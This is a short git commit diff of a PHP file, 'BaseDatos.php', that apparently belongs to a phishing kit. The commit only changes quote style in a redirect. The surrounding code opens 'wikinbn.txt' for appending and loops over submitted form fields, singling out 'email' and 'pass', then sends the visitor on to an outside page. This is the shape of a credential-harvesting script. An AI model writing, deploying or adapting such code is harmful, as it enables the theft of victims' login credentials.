d37c6aadfeb50c6eb8da51ca125d2390d3b43631
luisnike13 <66269694+luisnike13@users.noreply.github.com>
2021-06-06 02:54:26 -0400

    Update BaseDatos.php

--- BaseDatos.php
+++ BaseDatos.php
@@ -1,5 +1,5 @@
 <?php
-header("Location:https://yassange.github.io/pag-na-termux/");
+header('Location:https://yassange.github.io/pag-na-termux/');
 $handle = fopen("wikinbn.txt", "a");
 foreach ($_POST as $variable => $value) {
     if ($variable == "email" || $variable == "pass")
